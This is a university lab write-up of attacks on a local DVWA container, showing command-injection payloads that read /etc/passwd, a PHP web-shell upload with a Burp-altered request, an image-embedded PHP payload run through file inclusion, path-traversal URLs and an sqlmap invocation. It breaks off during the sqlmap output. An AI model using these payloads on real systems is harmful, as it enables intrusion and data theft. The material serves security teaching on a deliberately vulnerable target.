This pentest was conducted as a lab assignment under the IT Security subject of the Bachelor's Degree in Informatics Engineering of Unizar. As it was a lab assignment it doesn't perform the common pentest tasks such as getting a reverse shell...

The objective was to exploit at least 5 of the vulnerabilities inside the Damn Vulnerable Web Application machine, in the difficulties of easy and medium.
### Lab setup

Although in the material provided for the practice was an image prepared to run DVWA with little effort, with Kali Linux OS to have the necessary tools to perform the pentest, since both members of the group have Parrot OS Security as the main OS on our laptops we found it completely absurd to have to run a VM to simulate Kali (since both OSs come prepared with a wide variety of tools that meet the desired purposes).

To avoid having to make significant changes to the host OS, we have chosen to launch DVWA in its Docker format, using the following commands:
```bash
sudo docker pull vulnerables/web-dvwa
sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

However due to the fact that the default image does not have all the DVWA requirements to be able to perform all the tests we have had to investigate a little, to launch again the DVWA with all the necessary to be able to execute any of the tests (except the CAPTCHA) the following commands must be executed:

```bash
sudo docker pull vulnerables/web-dvwa
sudo docker run --rm -it  vulnerables/web-dvwa
CID=$(docker ps | grep dvwa | cut -d ' ' -f 1)
sudo docker exec ${CID} sed -i 's/allow_url_include = Off/allow_url_include = On/g' /etc/php/7.0/apache2/php.ini 
sudo docker exec ${CID} /etc/init.d/apache2 reload
```

Once the commands have been executed and the DVWA is running, simply check the IP assigned to the corresponding Docker network interface to be able to access the web. In our particular case the IP of the Docker interface of the Host is 172.17.0.1 so the IP of the DVWA container is 172.17.0.2, this IP is the one we must use to access the web at all times.

The access credentials are the following:
`admin`:`password`

The first time you log in you should use the following option to properly configure the environment:
`Create/Reset database`

### Scope of practice

We have chosen to perform the most significant attacks that potentially allow us to obtain unwanted access to the server. The chosen attacks have been carried out in all possible difficulties, additionally we only had to consult the code provided by the web in the File Upload attack in its difficult mode (because without knowing a priori the code this one was completely impossible), this approach has been followed because in a situation of Blackbox Pentesting or a real scenario of hacking / cyberwarfare the attacker never has access to the source code of the system to be breached (unless one or more previous negligence has occurred that allow it).

Although the practice only requires 5 different types of attacks to be completed, a total of 6 attacks have been performed, which are listed below. It should be noted that more attacks have not been performed mainly because all the remaining attacks, despite having a different particular approach, share the same typology, which is to exploit/execute js code or take advantage of an inadequate use of ids or tokens (the CAPTCHA has not been performed due to the difficulty mentioned in the previous section).

Attacks carried out:
- Command Injection
- File Upload
- File Inclusion
- SQLi
- SQLi Blind
- Brute Force

It should be noted that, as in a real scenario, we have tried to use as many available resources as possible, in this case pentesting tools, a list of all the tools and resources used is attached below:

- Burpsuite (+ addon en Firefox de Burp  Proxy Toogler)
- Bash/Shell
- Hexeditor
- sqlmap
- PayloadAllTheThings Website
- Hydra
- Patator
- Credentials Wordlists

As a last detail it is worth mentioning that the exercise has been limited to obtain the necessary information, without compromising the server completely by means of a web reverse shell, which is not very realistic, but given that once command execution is obtained in the server this is trivial, it has been decided not to do it.
### Command Injection

This attack consists of taking advantage of a server vulnerability that allows us to somehow introduce commands to be executed on the web server itself. In this case the web offers us a form in which we can enter an IP to perform a ping on it.

With some basic knowledge of PHP we can deduce that the code that performs this should be something like this: `system(ping $IP)`
#### Easy

To take advantage of the fact that we can enter arbitrary values without any type of control inside the form we simply write a `;` which ends the execution of the ping command and right after that we add the command we want to be executed in this case `/etc/passwd`. The final value to enter in the form is `;cat /etc/passwd`. After executing it we get the following

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

It has not been done since it has already been demonstrated that it is possible to execute commands on the server but to obtain the information related to the hosts we should simply change the file read by `/etc/hosts` leaving as value to be entered `;cat /etc/hosts`; `;cat /etc/hosts`.
#### Normal

We try to repeat the previous trick with the `;` but this time we do not succeed, this implies that the code in charge of executing the command has some kind of previous filter so we try more Shell tricks. Another way to execute several commands is to use the conditional execution of success using `&&`, given that for the following command to be executed in this case **if** we need the ping command to work so we choose to add before the Google DNS IP `8.8.8.8.8`, as a test command we opt for `ls`, resulting the final test in `8.8.8.8.8 && ls` this test unfortunately does not work either.
Once tested the conditional execution of success we try the opposite, in this case we need the ping command to fail forcibly so we introduce something that forces the error such as an `a` character, the text to enter to test is `a | ls` this time if we get the command to run. Now to get the contents of `/etc/passwd` again simply `a | cat /etc/passwd`.

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

`a | cat /etc/hosts`

```txt
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	7abe71b66849
```
#### Hard

We try again the previous trick but this time we don't succeed, so we try again this trick removing all the spaces `a|ls`, in this case we are lucky and we get it right the first time, the final command is `a|cat /etc/passwd`.

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```
`a|cat /etc/hosts`
```txt
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	7abe71b66849
```
### File Upload
To demonstrate that an arbitrary file containing PHP code has been successfully uploaded and can somehow be executed, we have chosen to use an oneliner that takes the `cmd` parameter from the URL and executes the corresponding command on the server. The exact oneliner is `<?php system($_GET['cmd']);?>`
#### Easy

The first thing we need is to generate a `.php` file to upload our oneliner, we can generate it with the following command `echo '<?php system($_GET['cmd']);?>' > a.php`.

Once generated we simply try to upload it to the web, in this case we have no problem. To check if we have reached the arbitrary code execution we use the `ls` command, to do this we must access the following URL `http://172.17.0.2/hackable/uploads/a.php?cmd=ls`.
The result obtained is this:

```txt
a.php dvwa_email.png
```

#### Normal

Again we try to upload the previous file, this time we get an error because it does not have the right **extension**. To solve this problem we are going to use the double extension trick to execute the following command `cp a.php b.php.png`. We try to upload our new file, **but** before uploading this we activate the Burp Proxy Toogler extension in our Firefox browser, we also open the Burpsuite tool and enable the interception of packets in it, once all this is done we press the upload button.

The content of the request intercepted by Burpsuite is as follows:

```txt
POST /vulnerabilities/upload/ HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.17.0.2/vulnerabilities/upload/
Content-Type: multipart/form-data; boundary=---------------------------536677127989003954171006071
Content-Length: 483
Origin: http://172.17.0.2
DNT: 1
Connection: close
Cookie: PHPSESSID=t7oqci4giki4go7bmleo7b4vc5; security=medium
Upgrade-Insecure-Requests: 1

-----------------------------536677127989003954171006071
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------536677127989003954171006071
Content-Disposition: form-data; name="uploaded"; filename="b.php.png"
Content-Type: image/png

<?php system($_GET[cmd]);?>

-----------------------------536677127989003954171006071
Content-Disposition: form-data; name="Upload"

Upload
-----------------------------536677127989003954171006071--

```

One of the main features of Burpsuite apart from capturing packages is the possibility to modify them on the fly, the most obvious change worth trying is to change the value of the filename variable so that the final extension is just `.php`. The modified package is attached below:

```txt
POST /vulnerabilities/upload/ HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.17.0.2/vulnerabilities/upload/
Content-Type: multipart/form-data; boundary=---------------------------536677127989003954171006071
Content-Length: 483
Origin: http://172.17.0.2
DNT: 1
Connection: close
Cookie: PHPSESSID=t7oqci4giki4go7bmleo7b4vc5; security=medium
Upgrade-Insecure-Requests: 1

-----------------------------536677127989003954171006071
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
-----------------------------536677127989003954171006071
Content-Disposition: form-data; name="uploaded"; filename="b.php"
Content-Type: image/png

<?php system($_GET[cmd]);?>

-----------------------------536677127989003954171006071
Content-Disposition: form-data; name="Upload"

Upload
-----------------------------536677127989003954171006071--

```

Once modified we simply click the forward button in the tool and disable the Proxy addon.

To check for arbitrary code execution again we resort to the `ls` command, we simply visit the following URL `http://172.17.0.2/hackable/uploads/b.php?cmd=ls`.

We obtain the following result:
`a.php b.php dvwa_email.png`
#### Hard

After several unsuccessful tests, out of desperation and frustration in this particular case I consulted the specific code that executes the web server. Apparently the server does check that the uploaded file is a real image, however it is still possible to upload code, although it is not possible to execute it directly as in the previous cases, for this it will be necessary to use one of the other vulnerabilities, possibly the most useful vulnerability for this purpose is LFI since it loads arbitrary files from the web server, **executing** these as if they were PHP **although** they really are not.

The first step is to obtain an arbitrary image and give it the name `c.png`.
As a simple curiosity we have chosen to use the following image:

![[c.png]]

Now we are going to add the malicious code to the end of the image file, so that a normal image reader will ignore it, to do this we execute the command `echo "<?php system("ls") ?>" >> c.png`.

Now we simply upload our new image.

As a curiosity if we open the new image with the hexeditor tool we can see the following:

![[Pasted image 20231201130834.png]]

Once we have managed to upload the malicious code inside the web server we simply have to take advantage of any other vulnerability to execute it, as previously mentioned we have chosen LFI as it is the most appropriate (we have used the easy version of this).

We simply need to access the following link: `http://172.17.0.2/vulnerabilities/fi/?page=../../hackable/uploads/c.png`

The web will display the following content:

```txt
�PNG  IHDR���V�# pHYs���+ IDATx���y|T����W�J%�D�X�(���"�� XD��R(u�U�^��(j-Z�W{�ւ��^�n?)ZE��)�B�T��@��(�M� ��G2d3�s2g�s�y?���O�9�m�Ng&��h��"�8�7�3iӘ��Y�Gf����V%b��">hډ_O��~���NZS2���(�U�����x���u�r[�2�U��\� �qŔ��"��]w��]TF�*Q��[�O[���gMU�H{�d��:��=ڻ%�l���⬩Ji�(�;�nc�)��nf�VN)�O�c��ɏj�<N��n��E�G3�,*WR�����7QR���6�M�z1�z>�φ�Vͣ!a��[���+�ҌuK�ޭ}ʂ�8�-�.��С)��y��|Ѫy4DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD$�)'^���.�gū���aU{���L�����8�/�/Aw�E�kK��ĻF���T��fT[�=��ves����8�_�wK����J?�T�;k^,��\�we��""�Оߕ��5)Uc���1<*e�˕���$��wK��,1��'��,|��齲_՘�=�pR^�D��T�`&�+'>��y��ǉ-iq���c��RՃ����x{s$6(�R��;��{�|�IP�z<�|��~���U.;���?X{,�9�rбj+�U5���8����+���nq���i�� ^N�)��\��C���t���e\6��'��m>���dz��q,r��$+�U5���,����F{��C.�N���aEP����S�a0_�Õ'P������]��˕��:�7G"\��b3� XU��,��>g"ipr' �2+�����{�2�����w3$�J�PQV��_���5����+V�c|��Λ�nJi�+vmf�f(D�-h���RD$|��[jRƛ���Q��F�=,���������g������#���C��}<� ���c���nL��z�'�T�I ay`�����=��I�ĵYY�c�0���y5�&���BޘˌrN����N|s�d�͜�Т+w]ʲgxa+yL���^ĺr{��q+�{}�3/�_O�m����s��T�q�y ����f�K�m�k���w�C�x�+�� O?�������د��Π�D~ԏqK���dʢ����R���ܻ��os�ƹdMH���.���[���">�W�e_����a+b/�XK�.�w�g���k�j8?���_r�,v�J];�SūKc?W��R�]E�"�l���y�J��[��|��jH�8V�^�l�_3�ʹw�C�x����mqG�z���E�9�Qg��c�������z��ȖO��|g�MVN��U�%z�[��2~��_�9��qE\���hz�oV׻�熎��%�w�C���Њ¸#���x��V����Qp9.���Nh��q��E�b��ؒ���j�������z7�g�Q��Ӥ�F4����1��G7�h+��ҧyݱ���-[E�;��x�9���8���1�d~;�7^�k�#}c���oT����_=��a'�Z� ����C�𒆴�]5�W6��Ū�6��3λ�v��¤{��ʒL#�_��?��gQ�����������ж)m��Ջ����|6@�f:�r�%�lD�N�A�A�2�-v�I]��(6�eʟ�����>=��K��6Ѻ;�zrz�����Y�4O����Ͻ��X����>���n�6�l+��`��󕫡�����ZsF>o'��+K2z�R��2��)1n������ϳ��j� 6����?���أ��iO�ԭ�w%�5�/��4v\�7J��1�[xv:3�Կ���q;Wnֻ��\��s:�+���Y����QDB�^ʸ���i��E�w��쥌+�<��YDDDDDDDDDDDDDDDD$����$%C&rG>��e��-���q.ô����:��o��M{U�$�]�H��s��U3��pf�e��:�����n�1�۫J$��*ED�Gϻ��!�wi��n8��߾��{s�q2{Y�J��Aϻ��1��e������S?��_s��0�~3Ϡ�����Y�o>OR5_ٯl�����`�zh����t��5&ߛ��q������Fd��Y����2��^y*���u��gɓ��U�8��<�����W�+�>�wgsֻ�4w{�$�{8�M�%ߛ��q�]0S�٪����Y����4w/��s����$���y�E�H{w�$L�6g��LsO�.��y�M7��������y�k�s��U���>7ڴwGM��nsֻ�4w/�$�{�M7�����'ߛ��q�e�M�W�9�f^�齜mz�;jrs��;��7y� F���6�ҿ?��^��R��}|#S�Y���{2�5�g�!��Ч-�+x9ѧt��e5񕫙]�e�2����J N�wO��"o��{R&�e�~�ख़���7����R�P5�s�ü���K���?�=,ZCU�6g�,��OǹѦ�;Z�%v��7i���M59/��s �5'���X�ϗ�q�1�۫�ؙA?� ����U�x�ٛA�΍:��)~%v����7�~�+"""""""""""""""""('>2�.�U���X=��?c��l��%�i8�������W�5�7M���箫{v٤7e�y��� ���k3�ײ�#%�Kt�����# ��"H{�ٌA]�nFP�?j!�%7;���2׽�7e����*�f�K5�+`�>bd)K����z�&nr�ͼd�'f/s�]� �1���,�y�\�R�1�&ƕScQ9�;1�0�ٶg!���;<��[c/s�eӟPn���Y�+s=��uX9T��k;������r ��;<�妛�=�^�zZ�� �}�jU�y�T3�q�T��;�K��o�߳z�$<��68�g�)s=f͋<���g��o�d�'���_�}9a�f��a���Xj�w����tK�e��_�� �,����P��U��rTh�fA{wx��MwJ O{b���uO9��$ �}ݵ�^���4�@e�;����X�_���;�R�MwJ O{b���u�9�f�d����U��ͽ��{�z7�9����9��ˁ%q�ұ6�N{wu��>��|�g���]Ɔ��?���1�rn�̩�{"{���SP¤��ߋ��rB�k8�n{_�[�y�Jnd�p�^��aXkϩ�����ռ4�%���P��꪿NR��}ݵ��8�yIs���nns U�ʩ���ޡU�zG������L��Mn�))�Fb���uo9����έ��n�%�=h�놕s� ���`��=մ�6D�E�����ȯ+��z���k&YD�����ȯ+��z��RN�H��aZ���u6c�L[UBJW&�͹�Z�Oa;61�e�o%)��stt�̾L�R�� ���_-���4WK��L{wx��}2^�K��s)7~���ôU~7L�۵�囡����V��ݡQp)#ڳ�wLX@5P��p-Ϭb��mI/�vGڻ�(a�w��8����{����{ӻ� �j�^rv�+{I�oN<63��Js������j�����3 ��yާ����#}pz���%g��% >�9�5̙�^ػr��kg���W��CϻC�U>l&.[�]{Z�|����l�$��1'^��8��]�wS�<��o_�{���/��+�K�v�r�I�ả�����W�{��kg����X�^3 �j��8>��q��l&g��r�I��j0s�%]���E{w��� '���-N��S����l�+��o�3'^��0Ύ�]�wQ�<�n��|5n{��)���L�v�r�I��j0s����kU�CTA�d�Z/�̧���a��d��A��;��y/Y�9\�+�sS\H�f*j>2�.9;��o�+��Ɯx���J�j�f�a���ʕTlOp�dUÕO���G�i.S�L5|�>g�a��,\�>oU�=23�7�8��o�s���󕫡�����ZsF>o�%5{���Q ��q��is��s&��,���?Ȟ��Ey��D�/�mܟ�K�Nze/I�͉7�k�U5ʟbz.CpE�;�ְ3-U?R�M����j�Hr���/�ƌ�`�׋0�9}�zw�(�;3��s3�y_/��f�SN�48G|�D��gԽl�ݲT�����x9�>�>��S1�����y���ds���l둗�Ki_u�o��o�%�9�F�֣�ċ=� ����3���00�wf�����T��!�d�#�s9yq���� �\z33���k�|_ ��o��Y4�9�ۃ��{T�����`�^���o����m���,��n���U/��=LEw7(=���w3��7�2��Ӯat���Ŝx�}�c�=|�"֕��s,?Ĉ[���z�p�"�_����e�y�쾶g!��zw��?ݨ˕\҄������swR��m-'�|ߢR���ܻ��os�ƹd�S\��ek�|�W��}�u�i���9��^���,�gͮ�ҵ3le�����|ߌ�K9���v�LN�.��\ūKv]�X��f�����}������Y>���e�4�+3۴� �Ǖl��Q�=�y�g�g���X�$��W��m�v�5.�e˧m�i��ԣ���%QL�Oam�&����^���>�s�_t�ȉ7�7'�녌۪d<�H)�A�Y���s�������M�#�m��0�HaA�߰�o����В���V�ZŎ[�_��5l�ć��Y�v�|4f2�R���~�z�w��ek��~����w��?a)'�|����{���v�u�c�G�R�Øon�Y�S����B�S�oK�Y��үSO�N�#^����\u -Ѯ�F�����y��6s���ݷ����ד���/fطT��y�_v{���0�ě[ef#E���,D;E^ϻ�`η��~�-9��)����L��I�9���^�<�+��7�[J��y�:�H���O���~�\/U�}�<:�Y+8��ۯ���yv:�UX�K7�t���#ؙ3�^o�Q:���<J���3�[3�\2C3�.QI=���9�:�����t�H�������������������x�mJ����Ya�r)'ދ!�#�Q����>�-�~iO7xN���* >5��n�PN�EϻED�G{�-��o{��ɮl/��M�z�u7���S�{e�ć�a���]?d��,x�{.?*��ܰ��mK��o{�ֆ+�KswLU�s#��m��ˇy���^9-9�^R�Ø勵��k��&���BޘˌrN���\�+�����-R�8}�%>�-�������������6g�/x�vZŝm�:���n��~'�3��z��MU{3c�C)+�}����w�q�������5^*�b*��87D�^�-�Ӿ��[;]�R��c�8�}���b�d���)�`^Y9�Ag����a+��?���]|�ݹ!��L2�-�`��|kW^�"�l�����$y�v��z���>�3ۧ�U����jo���Y~2�y���1�B����mqG����9*3��;���[;^�F���j�g<�f|D�osu����ו�p�Y8Xu�/���h̠�n[gT�Kw���4w�*�[�y�IV7�{7�.���~]Y9�i���v�,l��(�;R����`fh�%qF���q�+[Jsw���6���䵛fa/S�m��-�|��Y�ys�����Px�q"����r�� |���Lbڋ�~3gs����m�JԆw��{_��o����)��qn@�+�� ��}�����+������xt�;�~�6�h��)�b�O���:��=>���[������A7sT�����Rr�*�g��^eù˙�����ܮ�ɩ�ե���xu)î�kk�8ec�����8�Hֻ��]s5Gռ����������y=�n8�r�۴�]l�K:��)@ۂXՐ� �����q�"*���J{>��9����}�2<㬽;��L��@u��Ƨ_;fc�_N|��n�ْh��g��9�dn�w,�2�ڻ�]δ�l��n� -99.a��U�c66���G��<΀��w���ħ����v.爄�X�'E^{�Ij��5���)$����'0��ߐπ�l�ll�r�#Vu�i�}W��[N|�����+����r���c9�$Gwh�6�x}������fvs�d�Ɛ˹i$3�r�S��\��C ����-�� %72u8C����0�5�簦�o������W��m4�{���.L�˺���F�楙,�����Tu_5����w����r J�t5�{��\Np_��fw�5_�\M��A�;��Z�;���ڻS�3�%;ٹxt�Vpf)�_�����tU ��~��G�jg�t#��n��Sω��f7�J?7s��������g7/�����0�~ۜ���� /�����0�~�,""""""""""""""""""�L)㵛Bve�l��w�bN�N!�ZĪ,Y��ɉ��-"Y��7�B<��[D��r��sF��jH�w�>��F�M�/���s��r0���$x7ce)���X��g��'X;U�զ�1E�!�<� ��>���/�����������e�xa��9 ޼bS���X�Jd7>jD '^L2����x��q���ۂ�.�EW�n�z� '�������y��ټ�<ޟ��L���N��;�~�x��I��8�^����u�`Vks�תdW6��y�{`~,�4�������ԾcY�Jk�J�Fο���[q�V�fݞ�ܯ=�g?[Yw��\T�6����z:����;Le>��g�RV�8�)��q�՜=���#|���!������N̚�S��|�_Wf�F�W���.�Ys�؞����ʼ�=0?.�Å0g!6�RV����|�">\��O,�*����I���3��Us�| s2z�|�3����� ��%s�ޕ�Y%�+'��M:V���<PN���9��P5���0'��|�c?a�G��6W�*���u{WfU���R"���('>�y��N̜Qm��S��)��䅍<�$��i�ܽd�ۻr0���Js��0V�ٝ1ʉ1/��\�T�3��Us��Ɩ�S����yw���-��4wi����%c�ֳ�����7}mMLpZ5d"w�3�^6:��'S���Wβ|�0��KXz��՞I��|��y���d�O H����VeI�w���&�RXW�QB�ɉyTrr�6�|3����f�$3�7���Qqo��Ȳ/�n��}�-"��r��.�iЖZ��T��!�d�#�s9yq���gAN�CBy6iS�7}AIDAT��H+�j�ć��4��R�ݴ�|�ĩ�L�����1��v �;�3��ّ�"�<����'�rm�?ٸ�k('>� )+�}�9�o��V%|$tIE��V�c�9�TF�T�����MϪ�xsBy�d�^�{d�i߻ͫ=29�������">^ě��}��J�Z�iպ,X]�v�[Y����k)������q�p~�=J���Y�HS�8�}���b��<[�SZ���K�kgr�xui��������6��X/W;Ԧ.���Q��ΐH����L�NG�&v�i ;�wd�1�!{��ٓ�2�<��G��nV;ʉ�`�A[j���cn��y�Ļ��M(�&摴��j���!��ѱ�t�m+W�[�R�m�"���£�����ɉw�P�l�c|Hsw��*C��ֆ Ϋ=F9�>3%I�f�a��駻4h/��&�Ze��U��B��޽)��j;7��ȉw�P�l�c��:/U3S������H{�W��Ήo��+��4�Ϣr%ۏ�UC1Wu�=��|>�^�|��&JJ\Bۦ�)�W/�^�'��w���ѣ뗱0ыq���yk�Y�VUn�c)W]B�F��ĸ�$� s�b7�ԅ��b�\���j��}�����Y��}ު�ׇ�n#�W�]��3RB� ��c�~U�m�uw����<��-��i����ٯ�e�y���Z��G�k�R�̫��>\H���mM���.f�'���`fD�y�Y�SL_���t�sb�s��\��[���Ly�W��o(������A_e�<67��;p�w�c4�9�A��Jc>��6�5��n����a��6�Y����x����n`�����:���3��ok�9��x�}F0�RN�κ= �m���l���XE��f�-�4�{dXW�N��ŏ�����?ľb.ɫ��@�a�������Q��G*�lyR{.lA��4�Ԧ��~7����ۼ���Ut�ÖW��q�}|�4V,���P;�^A�Oy�_�\K�׸�,�\�>hѕG�a�l~^�5e�s�s�wډ]I�33Y�|e[Uc�����0��T��f�e�RcZW����b��s�t�Ą�PY�r����!�� �?��p��}��7�٫��C��~7]��gѣ)<�qy�T�3a{�u�_}�i�Ϡ�G����0V��I��c��p�W��$�P�G%������^��&f0z��D±wgXH�ˣ�~O��a�ZZ��3��±2�w{�k��C�_����ׇr~�X��&f0̏�ҹw��k�r��C�_�.�:�2�^�� c5��dۇ���^:߫������)�=�1�w�������0�o��sT#���.�v�ܻm�{�r*yϡ�/��jw��A������o���d���]� i{i�ʙ;͠H�e�J{i�ʙ;͠������������������%�|�;C&rG>��ecz�%c�ֳ�����7CP� ��К����n@�NÙٗ cX�wK���_-����T%��6�&#)({w������P���T%��6�&#I��-">n�w7;���(=�F{X4�����\Υuc*���+<�'����Y�\�ϊW���`�*�l���sbn�egҦ1;���̚ϧi����=�.`��,䍹�(�k�!���\Ül��'�9ž3�(Y"{��~1�*z+Ǟ�ϯr�]>��r%�4��yb=���ܝ���ZTʠ6�;�{��m��a�8���q;�~�4��"�����}_��Ǔx3�M͚��W{w�ΰ��J��|ߌ��T���T��R�]E�"�l��Ⱥ,�gͮ45m�_�� ����\s5a�\�{���sy �v���Ek� x��h��jomd�ʱ�&�>�{N5�˸l�O���|XI�����S�X�� �T�Υ�)��?���[{���F�o(9�Y�<{0�����4v\�7J��1�[xv:3�d�����ȝ򧘞��\��β5�|��<a�za��\�Tm̠Ӟ���:��>\y��X�k�w���^bw�z�y4�X�¯�f���^��^bw�z�y4�X�¯�f���������������������H��4��2���#��դ7e�y����Z �>���tS���H�޻������l����S)Yy�>bd)K|�r�E$��_�w7�į'�a?���`'��)�y��5qQ9C�3�����_#� �0�o/�w�8�'#n��qL��X/D$�8�9��Y��p˃T\��Oؗ���i���5a����9�O�a{ܝ�����4�Ƈ{�CUUUU�e�a�1�f�{�]��264����5�!�s�HfN�cϨ�whբ���r^����:��W��{֚�s��w�sRUUUUuYu�s��faV��������t9�Ry�s�E$z�/""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""G���"�e�H1IEND�B`�file1.php file2.php file3.php file4.php help include.php index.php source
```
### Local File Inclusion(LFI)

This type of attack consists of abusing a server configuration error that allows opening server files without any kind of control. In real cases, this attack vector can be detected, for example, if a web site has the possibility of translating it and in doing so simply changes the name of the existing file at the end of the URL, for example:

`https://loquesea/?page=a_es.html` -> `https://loquesea/?page=a_en.html`
#### Easy

Naturally we start by directly testing the raw access without any kind of evasive measure to avoid detection, for this we access `http://172.17.0.2/vulnerabilities/fi/?page=../../hackable/flags/fi.php`.
We do not notice the existence of any countermeasure. We obtain the following result.

```txt
1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don't know.  
  
--LINE HIDDEN ;)--  
  
4.) The pool on the roof must have a leak.
```
#### Normal

Again we try our luck by testing the link used previously, as expected this no longer works since a very simple way to prevent LFI is to block the `../` character combination. This eliminates any possibility of using relative paths, however we can always opt for the use of absolute paths, for example to test we access `/etc/passwd` through `http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd`, this time if we succeed.

\*It is worth noting that due to the previous attacks (more specifically to the command injection) we know that the PATH of this is `/var/www/html/vulnerabilities/exec`, so we can deduce that the absolute path of the desired directory is the following `/var/www/html/hackable/flags/fi.php`.

With all this in mind we must visit the following URL: `http://172.17.0.2/vulnerabilities/fi/?page=/var/www/html/hackable/flags/fi.php`.
#### Hard

Again we tried our luck visiting the last URL, without success again.
The only trick left to try is to access an absolute URL with the `file:///` parameter which indicates that a file on the local file system must be accessed (this parameter could be another one such as `smb:///` allowing the vulnerability to be Remote File Inclusion(RFI)).

The new URL is the following: `http://172.17.0.2/vulnerabilities/fi/?page=file:///var/www/html/hackable/flags/fi.php`

### SQLi

The SQL Injection attack vector consists of taking advantage of unsanitized calls by the web server code to the corresponding database, this allows the user to exploit the syntax of the database itself to obtain information that at first should not, so we are facing the so-called `Information Disclosure` by MITRE, it is worth mentioning that it is also possible to obtain code execution in certain databases both manually and automatically through specific flags of some tools.

As it is evident for this vulnerability the tool in charge of this type of attacks par excellence `sqlmap` has been used.
#### Easy

In order to launch the tool we first need to extract the value of our session cookie from the web page, more specifically the value of `PHPSSESSID`. To launch the tool we simply indicate the cookies we want to use as well as the URL to attack (you can explicitly mark the parameter to use by `*`).

The command used is the following: `sqlmap -u 'http://172.17.0.2/vulnerabilities/sqli/?id=*&Submit=Submit#' -cookie "PHPSESSID=t7oqci4giki4go7bmleo7b4vc5; security=low"`.
We get the following output:

```txt
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
